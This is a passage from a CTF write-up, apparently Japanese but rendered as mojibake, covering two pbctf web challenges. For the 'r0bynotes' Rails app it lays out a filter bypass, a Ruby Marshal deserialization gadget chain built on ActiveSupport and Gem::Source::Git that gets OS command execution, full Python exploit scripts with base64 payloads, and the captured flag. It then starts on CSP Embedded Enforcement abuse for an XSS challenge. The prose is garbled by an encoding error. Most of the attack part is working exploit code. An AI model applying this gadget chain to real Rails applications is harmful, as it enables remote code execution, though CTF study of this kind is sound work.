`app/controllers/users_controller.rb` ã§ãƒ¦ãƒ¼ã‚¶ã®ä½œæˆæ™‚ã«ã©ã®ã‚ˆã†ãªå‡¦ç†ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚

`create` ãƒ¡ã‚½ãƒƒãƒ‰ã§ã¯ã€`cache_key` ãƒ¡ã‚½ãƒƒãƒ‰ã®è¿”ã‚Šå€¤ã‚’ã‚­ãƒ¼ã«ã€`user_params[:name]` ã¨ãƒ¦ãƒ¼ã‚¶ã®åå‰ã‚’å€¤ã¨ã—ã¦ `Redis.cache` ã«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã—ã¦ã„ã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ã®åå‰ã®æ–¹ã¯å®¹æ˜“ã«æ“ä½œã§ãã¾ã™ãŒã€`cache_key` ãƒ¡ã‚½ãƒƒãƒ‰ã®è¿”ã‚Šå€¤ã«ã¤ã„ã¦ã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚è©³ã—ãè¦‹ã¦ã¿ã¾ã™ã€‚

`cache_key` ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰ã¯ `user_id` ãƒ¡ã‚½ãƒƒãƒ‰ãŒå‘¼ã³å‡ºã•ã‚Œã€`user_id` ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰ã¯ `raw_user_id` ãƒ¡ã‚½ãƒƒãƒ‰ãŒå‘¼ã³å‡ºã•ã‚Œã¦ã„ã¾ã™ã€‚`raw_user_id` ãƒ¡ã‚½ãƒƒãƒ‰ã§ã¯ `id` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒä¸ãˆã‚‰ã‚Œã¦ã„ã‚Œã°ãã‚Œã‚’ã€ä¸ãˆã‚‰ã‚Œã¦ã„ãªã‘ã‚Œã° `(ãƒ¦ãƒ¼ã‚¶å)(32 æ–‡å­—ã®ãƒ©ãƒ³ãƒ€ãƒ ãª hex æ–‡å­—åˆ—)` ã‚’è¿”ã—ã¦ã„ã¾ã™ã€‚

```ruby
class UsersController < ApplicationController
    before_action :user_exists?, only: :show
    before_action :valid_user_id?, only: [:show, :create]
    before_action :valid_attributes?, only: :create

    def new
    end

    def show
        existing_user
    end

    def create
        Rails.cache.write(cache_key, user_params[:name], expires_in: 5.minutes)
        redirect_to action: "show", id: user_id
    end

    private
    def existing_user
        @existing_user ||= Rails.cache.read(cache_key)
    end

    def user_params
        @user_params ||= params.require(:user).permit(:username, :name)
    end

    def raw_user_id
        params[:id] || sprintf("#{user_params[:username]}%1$s", SecureRandom.hex)
    end

    def user_id
        @user_id ||= raw_user_id[0..100]
    end

    def cache_key
        @cache_key ||= user_id
    end

    def valid_user_id?
        raise ActionController::BadRequest.new("invalid username") if raw_user_id&.count("^a-z0-9") > 0
    end

    def user_exists?
        raise ActionController::RoutingError.new("user not found") unless existing_user
    end

    def valid_attributes?
        raise ActionController::BadRequest.new("invalid attributes") if user_params[:username].length + user_params[:name].length > 500
    end

end
```

ãªã‚‹ã»ã©ã€`id` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã« `/notes/hogehoge` ã‚’ã€`name` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ãŸæ–‡å­—åˆ—ã‚’ä¸ãˆã‚Œã°ã‚ˆã„ã®ã‹ã¨æ€ã£ã¦ã—ã¾ã„ã¾ã™ãŒã€ãã“ã¾ã§ã†ã¾ãã¯ã„ãã¾ã›ã‚“ã€‚`valid_user_id?` ã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ã«ã‚ˆã£ã¦ `a-z0-9` ä»¥å¤–ã®æ–‡å­—ãŒå«ã¾ã‚Œã¦ã„ãªã„ã‹ãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã§ã™ã€‚

ãŸã ã€ã‚‚ã— `id[]` ã®ã‚ˆã†ã« `id` ãŒé…åˆ—ãªã‚‰ã°ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚`Array` ã‚‚ `String` ã¨åŒæ§˜ã« `count` ã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒã£ã¦ã„ã¾ã™ã—ã€`['/'].count('^a-z0-9')` ã¯ `0` ã«ãªã£ã¦ (ãŸã¨ãˆè¦ç´ ã®ã²ã¨ã¤ã§ã‚ã‚‹æ–‡å­—åˆ—ãŒ `/` ã¨ã„ã†æ–‡å­—ã‚’å«ã‚“ã§ã„ã¦ã‚‚) `valid_user_id?` ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚

`Rails.cache` ã®å®Ÿè£…ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€[`ActiveSupport::Cache::Store` ã® `write` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rails/rails/blob/914caca2d31bd753f47f9168f2a375921d9e91cc/activesupport/lib/active_support/cache.rb#L465-L472)ã§ã¯ã¾ãš [`normalize_key` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rails/rails/blob/914caca2d31bd753f47f9168f2a375921d9e91cc/activesupport/lib/active_support/cache.rb#L649-L651)ã«ã‚ˆã£ã¦æ›¸ãè¾¼ã¾ã‚Œã‚‹ã‚­ãƒ¼ã®å‡¦ç†ãŒã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚`normalize_key` ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰ã¯ã•ã‚‰ã« [`expanded_key` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rails/rails/blob/914caca2d31bd753f47f9168f2a375921d9e91cc/activesupport/lib/active_support/cache.rb#L684-L699)ãŒå‘¼ã³å‡ºã•ã‚Œã¦ã„ã¾ã™ãŒã€ã‚ˆãè¦‹ã‚‹ã¨æœ€çµ‚çš„ã« `to_param` ã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ã«ã‚ˆã£ã¦æ–‡å­—åˆ—åŒ–ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã¨ã„ã†ã“ã¨ã§ã€`id[]=/notes/abc` ã®ã‚ˆã†ã« `id` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é…åˆ—ã«ã—ã¦ã‚„ã‚Œã° Insecure Deserialization ãŒã§ãã‚‹ã¯ãšã§ã™ã€‚è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã¾ãšé©å½“ãª `Note` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¦ã‚„ã‚Šã¾ã™ã€‚

```ruby
require 'base64'
require 'date'

class Note
    attr_accessor :author, :body, :date, :id

    def initialize(author:, body:, id:, date: Time.now)
        @id = id
        @author = author
        @body = body
        @date = date
    end
end

Base64.encode64 Marshal.dump(Note.new(author: 'A', body: 'B', id: 'C', date: DateTime.new))
```

å‡ºåŠ›ã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’ `user[name]` ã«å…¥ã‚Œã¦ POST ã™ã‚‹ã‚ˆã†ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ›¸ãã¾ã™ã€‚

```python
import base64
import re
import requests
BASE = 'https://(çœç•¥)'

sess = requests.Session()
req = sess.get(BASE + '/users/new')
token = re.findall(r'name="authenticity_token" value="(.+?)"', req.text)[0]
req = sess.post(BASE + '/users', data={
  'authenticity_token': token,
  'user[username]': 'poyo',
  'user[name]': base64.b64decode("BAhvOglOb3RlCToIQGlkSSIGQwY6BkVUOgxAYXV0aG9ySSIGQQY7B1Q6CkBi\nb2R5SSIGQgY7B1Q6CkBkYXRlVToNRGF0ZVRpbWVbC2kAaQBpAGkAaQBmDDIy\nOTkxNjE=\n"),
  'id[]': '/notes/abc'
})
print(req)
```

ã“ã‚Œã‚’å®Ÿè¡Œã—ã¦ã‹ã‚‰ `/notes/abc` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« Insecure Deserialization ã«ã‚ˆã£ã¦ãƒãƒ¼ãƒˆã®å½é€ ãŒã§ãã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã§ãã¾ã—ãŸã€‚

![ãƒãƒ¼ãƒˆãŒå½é€ ã§ãã¦ã„ã‚‹](../images/2020-12-10_r0bynotes2.png)

### gadget chain ã‚’çµ„ã‚€
ã‚ã¨ã¯ã‚„ã‚‹ã ã‘ã‹ã¨æ€ã„ãã‚„ã€å…ˆç¨‹ç´¹ä»‹ã—ãŸãµãŸã¤ã®è¨˜äº‹ã®ã„ãšã‚Œã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä»•è¾¼ã‚“ã§ã‚‚ä½•ã‚‚èµ·ã“ã‚Šã¾ã›ã‚“ã€‚ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã ã‘ã§ã™ã€‚

åŸå› ã‚’æ¢ã£ã¦ã„ã‚‹ã¨ã€OS ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã®ãŸã‚ã«é‡è¦ãª gadget ã§ã‚ã‚‹ `ERB` (`result` ãƒ¡ã‚½ãƒƒãƒ‰ã¯ `@src` ã‚’ `eval` ã™ã‚‹) ã‚‚ `Gem::StubSpecification` (`data` ãƒ¡ã‚½ãƒƒãƒ‰ã¯ `Kernel#open` ã‚’å‘¼ã¶) ã‚‚[æ—¢ã«](https://github.com/ruby/ruby/commit/b3507bf147ff47e331da36ba7c8e6b700c513633)[å¯¾ç­–](https://github.com/rubygems/rubygems/commit/bfb3f6749483f562e32141db6d876f7e08709bfc)ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚è‡ªåˆ†ã§æ–°ã—ã„ gadget ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚‹ã‚ˆã†ã§ã™ã€‚

å¹¸ã„ã«ã‚‚ `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` ã¨ã„ã† Phrack Magazine ã§ç´¹ä»‹ã•ã‚Œã¦ã„ã‚‹ä»¥ä¸‹ã®ã‚ˆã†ãª[å¤§å¤‰ä¾¿åˆ©ãª gadget](https://github.com/rails/rails/blob/dce3bab97044513ac4c6d61fdcce4cbc8b81627d/activesupport/lib/active_support/deprecation/proxy_wrappers.rb#L22-L25) ã¯ã¾ã ä½¿ãˆã¾ã™ã€‚

```ruby
        def method_missing(called, *args, &block)
          warn caller_locations, called, args
          target.__send__(called, *args, &block)
        end
```

ã¾ãŸã€[ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ãª gadget chain ã«ã¤ã„ã¦ã®è¨˜äº‹](https://www.elttam.com/blog/ruby-deserialization/)ã§è¦‹ã¤ã‹ã£ãŸ gadget ã¨ã—ã¦ `Gem::Source::Git` ã¨ã„ã†ã‚¯ãƒ©ã‚¹ã«å­˜åœ¨ã™ã‚‹ `cache` ã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ãŒç´¹ä»‹ã•ã‚Œã¦ã„ã¾ã—ãŸãŒã€ã“ã¡ã‚‰ã‚‚[ä¿®æ­£ã•ã‚Œã¦ã„ã¾ã›ã‚“](https://github.com/rubygems/rubygems/blob/6914b4ec439ae1e7079b3c08576cb3fbce68aa69/lib/rubygems/source/git.rb#L117-L129)ã€‚

ãŸã ã€`cache` ã¯ä»¥ä¸‹ã®ã‚ˆã†ã« `Kernel#system` ã‚’ä½¿ã£ã¦ã„ã‚‹ãŸã‚ã« OS ã‚³ãƒãƒ³ãƒ‰ãŒæˆåŠŸã—ãŸã‹å¤±æ•—ã—ãŸã‹ã¨ã„ã†æƒ…å ±ã—ã‹å¾—ã‚‰ã‚Œãšã€ã¾ãŸå¯å¤‰é•·å¼•æ•°ã‚’ä½¿ã£ã¦å‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ãŸã‚ã« `@git` ãŒå®Ÿè¡Œã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã¨ã—ã¦è§£é‡ˆã•ã‚Œã€`bash -c "..."` ã®ã‚ˆã†ãª OS ã‚³ãƒãƒ³ãƒ‰ã‚’ä»•è¾¼ã‚€ã“ã¨ãŒã§ããšã€ã‚ã¾ã‚Šä¾¿åˆ©ãª gadget ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

```ruby
  def cache # :nodoc:
    return unless @remote

    if File.exist? repo_cache_dir
      Dir.chdir repo_cache_dir do
        system @git, 'fetch', '--quiet', '--force', '--tags',
               @repository, 'refs/heads/*:refs/heads/*'
      end
    else
      system @git, 'clone', '--quiet', '--bare', '--no-hardlinks',
             @repository, repo_cache_dir
    end
  end
```

åŒã˜ `lib/rubygems/source/git.rb` ã‚’çœºã‚ã¦ã„ã‚‹ã¨ã€[`rev_parse` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rubygems/rubygems/blob/6914b4ec439ae1e7079b3c08576cb3fbce68aa69/lib/rubygems/source/git.rb#L180-L192)ã¨ã„ã†ä»¥ä¸‹ã®ã‚ˆã†ãª gadget ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚`Dir.chdir` ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã« `repo_cache_dir` ãƒ¡ã‚½ãƒƒãƒ‰ã®è¿”ã‚Šå€¤ãŒå­˜åœ¨ã™ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ãªã‘ã‚Œã°ãªã‚‰ãªã„ã¨ã„ã†æ¡ä»¶ã¯ã‚ã‚Šã¾ã™ãŒã€ãã‚Œã•ãˆã‚¯ãƒªã‚¢ã™ã‚Œã° [`Gem::Util.popen`](https://github.com/rubygems/rubygems/blob/6914b4ec439ae1e7079b3c08576cb3fbce68aa69/lib/rubygems/util.rb#L55-L57) ã¨ã„ã† OS ã‚³ãƒãƒ³ãƒ‰ã«ã‚ˆã‚‹å‡ºåŠ›ã‚’æ–‡å­—åˆ—ã¨ã—ã¦è¿”ã—ã¦ãã‚Œã‚‹ä¾¿åˆ©ãªãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã‚“ã§ãã‚Œã¾ã™ã€‚

```ruby
  def rev_parse # :nodoc:
    hash = nil

    Dir.chdir repo_cache_dir do
      hash = Gem::Util.popen(@git, 'rev-parse', @reference).strip
    end

    raise Gem::Exception,
          "unable to find reference #{@reference} in #{@repository}" unless
            $?.success?

    hash
  end
```

[`repo_cache_dir` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rubygems/rubygems/blob/6914b4ec439ae1e7079b3c08576cb3fbce68aa69/lib/rubygems/source/git.rb#L173-L175)ã®å®šç¾©ã¯ä»¥ä¸‹ã®ã¨ãŠã‚Šã§ã™ã€‚[`uri_hash` ãƒ¡ã‚½ãƒƒãƒ‰](https://github.com/rubygems/rubygems/blob/6914b4ec439ae1e7079b3c08576cb3fbce68aa69/lib/rubygems/source/git.rb#L227-L239)ã®å®šç¾©ã‚‚è¼‰ã›ã¦ã„ã¾ã™ãŒã€`repo_cache_dir` ãƒ¡ã‚½ãƒƒãƒ‰ãŒè¿”ã™ãƒ‘ã‚¹ã‚’å¥½ããªã‚‚ã®ã«æ“ä½œã™ã‚‹ã®ã¯é›£ã—ã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```ruby
  def repo_cache_dir # :nodoc:
    File.join @root_dir, 'cache', 'bundler', 'git', "#{@name}-#{uri_hash}"
  end

# ...

  def uri_hash # :nodoc:
    require 'digest' # required here to avoid deadlocking in Gem.activate_bin_path (because digest is a gem on 2.5+)

    normalized =
      if @repository =~ %r{^\w+://(\w+@)?}
        uri = URI(@repository).normalize.to_s.sub %r{/$},''
        uri.sub(/\A(\w+)/) { $1.downcase }
      else
        @repository
      end

    Digest::SHA1.hexdigest normalized
  end
```

ã—ã‹ã—ãªãŒã‚‰ã€`cache` ãƒ¡ã‚½ãƒƒãƒ‰ã‚‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã—ã¦ãŠã‚Šã€ã‚‚ã—ãã®è¿”ã‚Šå€¤ã§ã‚ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå­˜åœ¨ã—ã¦ã„ãªã‘ã‚Œã° `git clone` ã™ã‚‹ã¨ã„ã†å‡¦ç†ã‚’ã—ã¦ã„ã¾ã™ã€‚ãªã®ã§ã€ã¾ãš `cache` ãƒ¡ã‚½ãƒƒãƒ‰ã® `git clone` ã«ã‚ˆã£ã¦ `repo_cache_dir` ãƒ¡ã‚½ãƒƒãƒ‰ã®è¿”ã™ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ä½œæˆã—ã€æ¬¡ã« `rev_parse` ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã¨ã„ã†é †ç•ªã§å‘¼ã³å‡ºã—ã¦ã‚„ã‚Œã°ã€`Gem::Util.popen` ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã¯ãšã§ã™ã€‚

ãã‚Œã§ã¯ã€gadget chain ã‚’çµ„ã¿ç«‹ã¦ã¾ã—ã‚‡ã†ã€‚

```ruby
require "base64"
require 'date'

class Note
  attr_accessor :author, :body, :date, :id

  def initialize(author:, body:, id:, date: Time.now)
    @id = id
    @author = author
    @body = body
    @date = date
  end
end

class ActiveSupport
  class Deprecation
    def initialize()
      @silenced = true
    end
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation.new
      end
    end
  end
end

###
# 1st payload
###
obj = Gem::Source::Git.allocate
obj.instance_variable_set :@git, "git"
obj.instance_variable_set :@repository, "https://github.com/jwt/ruby-jwt"
obj.instance_variable_set :@remote, ""
# for repo_cache_dir
obj.instance_variable_set :@root_dir, "/app/tmp"
obj.instance_variable_set :@name, ""

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set :@instance, obj
depr.instance_variable_set :@method, :cache
depr.instance_variable_set :@var, "@cache"
depr.instance_variable_set :@deprecator, ActiveSupport::Deprecation.new

puts Base64.encode64(Marshal.dump(Note.new(author: depr, body: 'B', id: 'C', date: DateTime.new))).gsub(/\n/, '')

###
# 2nd payload
###
obj = Gem::Source::Git.allocate
obj.instance_variable_set :@git, "/read_flag"
obj.instance_variable_set :@repository, "https://github.com/jwt/ruby-jwt"
obj.instance_variable_set :@remote, ""
# for repo_cache_dir
obj.instance_variable_set :@root_dir, "/app/tmp"
obj.instance_variable_set :@name, ""
# for rev_parse
obj.instance_variable_set :@reference, ""

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set :@instance, obj
depr.instance_variable_set :@method, :rev_parse
depr.instance_variable_set :@var, "@rev_parse"
depr.instance_variable_set :@deprecator, ActiveSupport::Deprecation.new

puts Base64.encode64(Marshal.dump(Note.new(author: depr, body: 'B', id: 'C', date: DateTime.new))).gsub(/\n/, '')
```

```python
# coding: utf-8
import base64
import random
import re
import requests
BASE = 'http://(çœç•¥)'
PATH = '/notes/poyoyon' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))

sess = requests.Session()

req = sess.get(BASE + '/users/new')
token = re.findall(r'name="authenticity_token" value="(.+?)"', req.text)[0]
sess.post(BASE + '/users', data={
  'authenticity_token': token,
  'user[username]': 'poyo',
  'user[name]': base64.b64decode("BAhvOglOb3RlCToIQGlkSSIGQwY6BkVUOgxAYXV0aG9ybzpAQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb246OkRlcHJlY2F0ZWRJbnN0YW5jZVZhcmlhYmxlUHJveHkJOg5AaW5zdGFuY2VvOhVHZW06OlNvdXJjZTo6R2l0CjoJQGdpdEkiCGdpdAY7B1Q6EEByZXBvc2l0b3J5SSIkaHR0cHM6Ly9naXRodWIuY29tL2p3dC9ydWJ5LWp3dAY7B1Q6DEByZW1vdGVJIgAGOwdUOg5Acm9vdF9kaXJJIg0vYXBwL3RtcAY7B1Q6CkBuYW1lSSIABjsHVDoMQG1ldGhvZDoKY2FjaGU6CUB2YXJJIgtAY2FjaGUGOwdUOhBAZGVwcmVjYXRvcm86H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uBjoOQHNpbGVuY2VkVDoKQGJvZHlJIgZCBjsHVDoKQGRhdGVVOg1EYXRlVGltZVsLaQBpAGkAaQBpAGYMMjI5OTE2MQ=="),
  'id[]': PATH
})
sess.get(BASE + PATH)

req = sess.get(BASE + '/users/new')
token = re.findall(r'name="authenticity_token" value="(.+?)"', req.text)[0]
sess.post(BASE + '/users', data={
  'authenticity_token': token,
  'user[username]': 'poyo',
  'user[name]': base64.b64decode("BAhvOglOb3RlCToIQGlkSSIGQwY6BkVUOgxAYXV0aG9ybzpAQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb246OkRlcHJlY2F0ZWRJbnN0YW5jZVZhcmlhYmxlUHJveHkJOg5AaW5zdGFuY2VvOhVHZW06OlNvdXJjZTo6R2l0CzoJQGdpdEkiDy9yZWFkX2ZsYWcGOwdUOhBAcmVwb3NpdG9yeUkiJGh0dHBzOi8vZ2l0aHViLmNvbS9qd3QvcnVieS1qd3QGOwdUOgxAcmVtb3RlSSIABjsHVDoOQHJvb3RfZGlySSINL2FwcC90bXAGOwdUOgpAbmFtZUkiAAY7B1Q6D0ByZWZlcmVuY2VJIgAGOwdUOgxAbWV0aG9kOg5yZXZfcGFyc2U6CUB2YXJJIg9AcmV2X3BhcnNlBjsHVDoQQGRlcHJlY2F0b3JvOh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgY6DkBzaWxlbmNlZFQ6CkBib2R5SSIGQgY7B1Q6CkBkYXRlVToNRGF0ZVRpbWVbC2kAaQBpAGkAaQBmDDIyOTkxNjE="),
  'id[]': PATH
})
req = sess.get(BASE + PATH)
print(req.text)
```

```
$ python solve.py
...
<div class="card" style="width: 24rem;">
  <div class="card-body">
    <h4 class="card-title">flag{wh3n_c0un7_d035n7_c0un7}</h4>
    <h6 class="card-subtitle mb-2 text-muted">-4712-01-01 00:00:00</h6>
    <p class="card-text">B</p>
  </div>
</div>
...
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
pbctf{wh3n_c0un7_d035n7_c0un7}
```

## [Web 443] XSP (3 solves)
> Another notes app: (URL)
> 
> By: Jazzy
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: app.py

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ¡ãƒ¢ã‚’å–ã‚Œã‚‹ Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

![ãƒãƒ¼ãƒˆã‚¢ãƒ—ãƒª](../images/2020-12-10_xsp1.png)

`List Notes` ã‹ã‚‰ãƒ¡ãƒ¢ã®ä¸€è¦§ãŒé–²è¦§ã§ãã¾ã™ãŒã€ã“ã®ãƒšãƒ¼ã‚¸ã®å®Ÿè£…ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚ã¡ãªã¿ã«ã€`/data/38/9e/57/fb/8b/b6/ad/5f/e2/67/eb/7f/8b/29/7f/b6` ã¨ã„ã†ãƒ‘ã‚¹ã¯ãƒ¦ãƒ¼ã‚¶ã«ã‚ˆã£ã¦ç•°ãªã£ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚

```html
<body>
    <h1>NOTES</h1>
    <div id="notes">
    </div>
    <script src="/notes.js"></script>
    <script src="/data/38/9e/57/fb/8b/b6/ad/5f/e2/67/eb/7f/8b/29/7f/b6" async defer></script>
</body>
```

`/notes.js` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã™ã€‚`notes_callback` ã¨ã„ã†è¨˜äº‹ã®è¡¨ç¤ºã®ãŸã‚ã®é–¢æ•°ã®ã¿ãŒå®šç¾©ã•ã‚Œã¦ã„ã¾ã™ã€‚

```javascript
        function notes_callback(notes){
            notes.forEach(function(note){
                let name = note['name']
                let data = note['data']

                let name_node = document.createElement("h3");
                name_node.innerHTML = name;
                
                document.getElementById('notes').appendChild(name_node);

                let data_node = document.createElement("h5");
                data_node.innerHTML = data;

                document.getElementById('notes').appendChild(data_node);
                
            });
        }
```

`/data/38/9e/57/fb/8b/b6/ad/5f/e2/67/eb/7f/8b/29/7f/b6` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã™ã€‚JSONP ã«ã‚ˆã£ã¦è¨˜äº‹ã®å†…å®¹ã‚’è¡¨ç¤ºã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚

```javascript
notes_callback([{"data": "content", "name": "name"}])
```

`Report Link` ã¨ã„ã†ãƒšãƒ¼ã‚¸ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã« URL ã‚’å ±å‘Šã™ã‚‹ã¨ admin ãŒå·¡å›ã—ã«æ¥ã‚‹ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚admin ã®ãƒ¡ãƒ¢ä¸€è¦§ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒ‘ã‚¹ (`data_path`) ã‚’ç‰¹å®šã—ã€æŠ•ç¨¿ã•ã‚ŒãŸãƒ¡ãƒ¢ã‚’ç›—ã¿å‡ºã›ã¨ã„ã†ã“ã¨ã§ã—ã‚‡ã†ã‹ã€‚

![report](../images/2020-12-10_xsp2.png)

ãªãŠã€ã“ã® Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§è¨­å®šã•ã‚Œã¦ã„ã‚‹ CSP ã¯ã€å…¨ãƒšãƒ¼ã‚¸ã§ä»¥ä¸‹ã®ã‚ˆã†ã«éå¸¸ã«å³ã—ã„ã‚‚ã®ã«ãªã£ã¦ã„ã¾ã™ã€‚`/notes.js` ã‚‚ã—ãã¯ JSONP ã® JavaScript ã‚³ãƒ¼ãƒ‰ã—ã‹å®Ÿè¡Œã§ãã¾ã›ã‚“ã€‚

```
content-security-policy: default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/38/9e/57/fb/8b/b6/ad/5f/e2/67/eb/7f/8b/29/7f/b6
```

### CSP Embedded Enforcement ã®æ‚ªç”¨
ã¾ãšã™ã¹ãã“ã¨ã¯ã€admin ã® `data_path` ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã™ã€‚

ã—ã°ã‚‰ãè€ƒãˆã¦ã€ãƒãƒªã‚·ãƒ¼ã« `data_path` ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒä½¿ãˆã‚‹ã®ã§ã¯ãªã„ã‹ã¨ã„ã†ã‚¢ã‚¤ãƒ‡ã‚¢ãŒå‡ºã¾ã—ãŸã€‚å…·ä½“çš„ãªæ–¹æ³•ã¨ã—ã¦æ€ã„ã¤ã„ãŸã®ã¯ [CSP Embedded Enforcement](https://w3c.github.io/webappsec-cspee/) ã¨ã‚ˆã°ã‚Œã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿæ§‹ã®æ‚ªç”¨ã§ã—ãŸã€‚

CSP Embedded Enforcement ã¯ã€

1. `iframe` è¦ç´ ã§ `csp` å±æ€§ã¨ã—ã¦åŸ‹ã‚è¾¼ã‚€ Web ãƒšãƒ¼ã‚¸ã«è¦æ±‚ã™ã‚‹ãƒãƒªã‚·ãƒ¼ã‚’è¨­å®šã™ã‚‹ã¨ã€
2. åŸ‹ã‚è¾¼ã‚€ Web ãƒšãƒ¼ã‚¸ã¸ã® HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ `Sec-Required-CSP` ã¨ã„ã† HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ã«ã‚ˆã£ã¦ãƒãƒªã‚·ãƒ¼ãŒææ¡ˆã•ã‚Œã€
3. åŸ‹ã‚è¾¼ã¾ã‚ŒãŸ Web ãƒšãƒ¼ã‚¸ã¯ã€è¦æ±‚ã•ã‚ŒãŸãƒãƒªã‚·ãƒ¼ã¨åŒç­‰ä»¥ä¸Šã«å³ã—ã„ãƒãƒªã‚·ãƒ¼ã‚’å«ã‚“ã  `Content-Security-Policy` HTTP ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ã‹ã€è¦æ±‚ã•ã‚ŒãŸãƒãƒªã‚·ãƒ¼ã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ã‚’ç¤ºã™ `Allow-CSP-From` HTTP ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ã‚’è¿”ã™
